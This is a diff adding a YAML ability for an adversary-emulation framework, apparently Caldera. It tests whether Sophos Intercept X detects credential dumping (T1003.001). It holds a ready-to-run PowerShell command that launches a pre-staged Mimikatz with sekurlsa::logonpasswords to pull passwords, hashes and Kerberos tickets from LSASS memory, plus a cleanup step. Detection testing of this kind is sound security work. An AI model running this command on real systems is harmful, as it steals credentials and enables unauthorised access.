@@ -1,0 +1,29 @@
+---
+- id: scn001-a3-mimikatz-sekurlsa
+  name: "SCN-001 | Extract Credentials via Mimikatz sekurlsa"
+  description: |
+    Runs Mimikatz sekurlsa::logonpasswords to extract plaintext credentials,
+    NTLM hashes, and Kerberos tickets from LSASS memory. This is the high-
+    fidelity detection step — Sophos Intercept X will block or alert on this.
+    Requires Mimikatz pre-staged at C:\Windows\Temp\mimi.exe.
+    Maps to T1003.001.
+  tactic: credential-access
+  technique:
+    attack_id: T1003.001
+    name: "OS Credential Dumping: LSASS Memory"
+  platforms:
+    windows:
+      psh:
+        command: |
+          Write-Output "=== MIMIKATZ SEKURLSA (T1003.001) ===";
+          Write-Output "[*] Attempting sekurlsa::logonpasswords...";
+          $mimiPath = "C:\Windows\Temp\mimi.exe";
+          if (-not (Test-Path $mimiPath)) {
+            Write-Output "[!] Mimikatz not found at $mimiPath — pre-stage required";
+            exit 1
+          };
+          & $mimiPath privilege::debug sekurlsa::logonpasswords exit 2>&1 | Out-String;
+          Write-Output "=== END MIMIKATZ ==="
+        cleanup: |
+          Remove-Item -Path "C:\Windows\Temp\mimi.exe" -Force -ErrorAction SilentlyContinue;
+          Write-Output "Cleanup complete"
